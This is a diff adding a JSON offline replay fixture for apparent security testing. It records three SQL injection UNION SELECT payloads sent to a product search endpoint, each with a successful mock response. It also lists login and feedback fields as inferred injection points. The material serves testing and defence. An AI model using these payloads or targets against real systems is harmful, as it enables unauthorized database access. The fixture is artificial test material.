@@ -1,0 +1,94 @@
+{
+  "source": "scenario3/lan-25: sanitized request geometry and three controlled UNION observations",
+  "limitations": "Offline replay fixture only. Paths replace the target origin; no old observation IDs, ownership or secrets are reused. New mock HTTP observations must pass current proof gates.",
+  "search": [
+    {
+      "path_query": "/rest/products/search?q=apple%27))%20UNION%20SELECT%2049,49,49,49,49,49,49,49,49--",
+      "status": 200,
+      "body": {
+        "status": "success",
+        "data": [
+          {
+            "id": 49,
+            "name": 49,
+            "description": 49,
+            "price": 49,
+            "deluxePrice": 49,
+            "image": 49,
+            "createdAt": 49,
+            "updatedAt": 49,
+            "deletedAt": 49
+          }
+        ]
+      }
+    },
+    {
+      "path_query": "/rest/products/search?q=apple%27))%20UNION%20SELECT%207*7,7*7,7*7,7*7,7*7,7*7,7*7,7*7,7*7--",
+      "status": 200,
+      "body": {
+        "status": "success",
+        "data": [
+          {
+            "id": 49,
+            "name": 49,
+            "description": 49,
+            "price": 49,
+            "deluxePrice": 49,
+            "image": 49,
+            "createdAt": 49,
+            "updatedAt": 49,
+            "deletedAt": 49
+          }
+        ]
+      }
+    },
+    {
+      "path_query": "/rest/products/search?q=apple%27))%20UNION%20SELECT%2049,49,49,49,49,49,49,49,49--",
+      "status": 200,
+      "body": {
+        "status": "success",
+        "data": [
+          {
+            "id": 49,
+            "name": 49,
+            "description": 49,
+            "price": 49,
+            "deluxePrice": 49,
+            "image": 49,
+            "createdAt": 49,
+            "updatedAt": 49,
+            "deletedAt": 49
+          }
+        ]
+      }
+    }
+  ],
+  "inferred_inputs": [
+    {
+      "method": "POST",
+      "endpoint": "/rest/user/login",
+      "parameter": "email",
+      "location": "json",
+      "content_type": "application/json"
+    },
+    {
+      "method": "POST",
+      "endpoint": "/rest/user/login",
+      "parameter": "password",
+      "location": "json",
+      "content_type": "application/json"
+    },
+    {
+      "method": "POST",
+      "endpoint": "/api/Feedbacks",
+      "parameter": "comment",
+      "location": "json"
+    },
+    {
+      "method": "PUT",
+      "endpoint": "/api/Feedbacks/{id}",
+      "parameter": "comment",
+      "location": "json"
+    }
+  ]
+}
